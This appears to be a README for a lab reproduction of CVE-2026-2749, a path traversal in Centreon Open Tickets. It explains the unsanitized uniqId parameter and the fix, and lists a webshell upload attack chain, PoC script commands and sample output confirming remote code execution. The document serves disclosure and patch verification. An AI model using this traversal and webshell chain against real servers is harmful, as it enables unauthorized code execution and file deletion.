# CVE-2026-2749 - Centreon Open Tickets Path Traversal to Remote Code Execution

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2026-2749 |
| Component | [Centreon Open Tickets](https://github.com/centreon/centreon) |
| Type | CWE-22: Path Traversal |
| CVSS | 9.9 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Affected | Centreon Open Tickets < 25.10.3 / < 24.10.8 / < 24.04.7 |
| Fix | Commits [`93782a3`](https://github.com/centreon/centreon/commit/93782a36463a0dcd593adc28821e4693d527f108) (25.10.x) and [`b07abb9`](https://github.com/centreon/centreon/commit/b07abb9d98699c25933a6f00ccd7cec08bda67ae) (develop) |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Vulnerability Details

Centreon Open Tickets, a module for the Centreon monitoring platform, contains a **critical path traversal vulnerability** in its file upload (`uploadFile.php`) and file removal (`removeFile.php`) AJAX endpoints. An authenticated user — even with the lowest privileges — can exploit unsanitized `uniqId` parameters to write arbitrary files to the server (leading to Remote Code Execution) or delete arbitrary files (leading to Denial of Service).

The vulnerability exists because both files accept user-controlled parameters — specifically `$_REQUEST['uniqId']` — and concatenate them directly into filesystem paths without any sanitization. In `uploadFile.php`, the destination path is constructed as:

```php
$file_dst = $dir . '/opentickets/' . $uniq_id . '__' . $file['name'];
```

The `$uniq_id` value comes directly from the HTTP request with no `basename()`, no regex validation, and no `realpath()` containment check. An attacker can inject `../../` sequences into the `uniqId` parameter to escape the intended `/tmp/opentickets/` directory and write files to any location writable by the web server process. The code also uses `rename()` instead of `move_uploaded_file()`, bypassing PHP's built-in upload verification.

Similarly, `removeFile.php` constructs an `unlink()` path using the same unsanitized parameters, allowing deletion of any file accessible to the web server user.

### Attack Chain

```
1. Authenticate to Centreon (any valid user, including low-privilege accounts)
2. POST multipart upload to call.php?action=upload-file&uniqId=../../var/www/html/centreon/pwned
3. uploadFile.php writes webshell to /var/www/html/centreon/pwned__shell.php (path traversal)
4. GET /centreon/pwned__shell.php?cmd=id — RCE as www-data
5. Clean up via remove-file action using the same traversal
```

### Fix

The fix (commit [`93782a3`](https://github.com/centreon/centreon/commit/93782a36463a0dcd593adc28821e4693d527f108)) implements defense-in-depth across both files:

**uploadFile.php:**
1. Strict regex on `uniqId` (`/^[a-f0-9]{13}(\.[0-9]{8})?$/D`) — rejects any `../` sequences
2. `basename()` on `$file['name']` — strips directory components
3. `realpath()` containment — verifies resolved path stays within target directory
4. `move_uploaded_file()` replaces `rename()` — verifies genuine PHP upload

**removeFile.php:**
1. Same strict `uniqId` regex
2. `basename()` on filename parameter
3. `realpath()` + `str_starts_with()` containment check
4. Session-based file tracking — only allows deletion of files uploaded in current session

**Assessment:** The fix is thorough and complete. No bypass was identified.

## Lab Setup

### Architecture

```
┌────────────────────────────────────────────────────────────────┐
│  lab-net (bridge)                                              │
│                                                                │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ cve-2026-2749-vulnerable                                 │  │
│  │ PHP 8.2 + Apache (minimal Centreon reproduction)         │  │
│  │ Port: 80 (host: 8080)                                    │  │
│  └──────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2026-2749

# Build and start
docker compose build
docker compose up -d

# Run the exploit (from host)
python3 poc/poc.py localhost 8080

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2026-2749-vulnerable` | Vulnerable target | `php:8.2-apache-bookworm` | `8080` | PHP 8.2 + Apache serving vulnerable Open Tickets endpoints |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| Centreon (mock) | `admin` | `Centreon!2021` |

## PoC Usage

Three PoC scripts are provided, all written in Python 3 using only the standard library (no external dependencies).

### PoC 1: Arbitrary File Write to RCE (`poc.py`)

The primary exploit. Uploads a PHP webshell to the web root via path traversal, executes commands, and cleans up.

```bash
# Basic syntax
python3 poc/poc.py <host> <port>

# Against the lab (from host)
python3 poc/poc.py localhost 8080

# Against the lab (from container network)
python3 poc/poc.py 172.x.x.x 80
```

### Expected Output (Vulnerable)

```
=================================================================
  CVE-2026-2749: Centreon Open Tickets Path Traversal → RCE
  Target: 172.22.0.3:80
=================================================================

[*] Step 1: Authenticating to Centreon...
  [+] Authenticated successfully
  [+] Session cookie: PHPSESSID=4ef5dcf33f65b2ce1ea2ca16aa01e1d2

[*] Step 2: Uploading webshell via path traversal...
  [*] Traversal uniqId: ../../var/www/html/centreon/pwned
  [+] Webshell uploaded to: /var/www/html/centreon/pwned__shell.php

[*] Step 3: Executing commands via webshell (proving RCE)...
  [+] $ id
      uid=33(www-data) gid=33(www-data) groups=33(www-data)
  [+] $ whoami
      www-data

  ╔══════════════════════════════════════════════════════════╗
  ║  RCE CONFIRMED — CVE-2026-2749 successfully exploited   ║
  ╚══════════════════════════════════════════════════════════╝

[*] Step 4: Cleaning up webshell...
  [+] Webshell successfully removed

[+] EXPLOIT SUCCESSFUL — CVE-2026-2749 confirmed
```

### PoC 2: Arbitrary File Deletion (`poc_vector2.py`)

Demonstrates the file deletion primitive. Creates a canary file via upload traversal, then deletes it via the `removeFile.php` traversal.

```bash
python3 poc/poc_vector2.py <host> <port>
```

### PoC 3: Filename Traversal Test (`poc_vector3.py`)

Tests whether path traversal is possible through the uploaded filename (`$_FILES['name']`) rather than the `uniqId` parameter. **Result: NOT exploitable** — PHP's multipart parser strips directory components.

```bash
python3 poc/poc_vector3.py <host> <port>
```

## Verification: Vulnerable vs Patched

| Test | Vulnerable (< 25.10.3) | Patched (>= 25.10.3) |
|---|---|---|
| Upload with `uniqId=../../..` | File written outside `/tmp/opentickets/` | Rejected — `uniqId` fails strict regex |
| Webshell in web root | PHP webshell accessible, RCE confirmed | `basename()` + `realpath()` containment blocks traversal |
| `remove-file` with traversal | Arbitrary file deleted | `basename()` + session file tracking prevents deletion |
| `rename()` for upload | No upload source verification | `move_uploaded_file()` verifies genuine HTTP upload |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — arbitrary file write to RCE via `uniqId` path traversal |
| `poc/poc_vector2.py` | Vector 2 — arbitrary file deletion via `removeFile.php` traversal |
| `poc/poc_vector3.py` | Vector 3 — filename traversal test (not exploitable) |
| `Dockerfile.vulnerable` | PHP 8.2 + Apache with vulnerable Centreon Open Tickets endpoints |
| `docker-compose.yml` | Single-container lab orchestration |
| `vulnerable/` | PHP source files: `uploadFile.php`, `removeFile.php`, `call.php`, `login.php`, `index.php`, `centreon.conf` |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab build documentation |
| `poc_verification_report.md` | PoC test results |

## References

- [Centreon Security Bulletin](https://thewatch.centreon.com/latest-security-bulletins-64/cve-2026-2749-centreon-open-tickets-critical-severity-5493)
- [GitHub Advisory GHSA-p9c8-78v7-93hh](https://github.com/advisories/GHSA-p9c8-78v7-93hh)
- [CVE Record](https://www.cve.org/cverecord?id=CVE-2026-2749)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-2749)
- [Fix Commit (25.10 branch)](https://github.com/centreon/centreon/commit/93782a36463a0dcd593adc28821e4693d527f108)
- [Fix Commit (develop branch)](https://github.com/centreon/centreon/commit/b07abb9d98699c25933a6f00ccd7cec08bda67ae)
- [Centreon Repository](https://github.com/centreon/centreon)

## Timeline

| Date | Event |
|---|---|
| 2026-02-27 | CVE-2026-2749 published |
| 2026-02-27 | Centreon security bulletin released |
| 2026-02-27 | Fix commits merged (25.10.3, 24.10.8, 24.04.7) |
| 2026-02-28 | Lab reproduction and PoC verification completed |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2026-2749 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
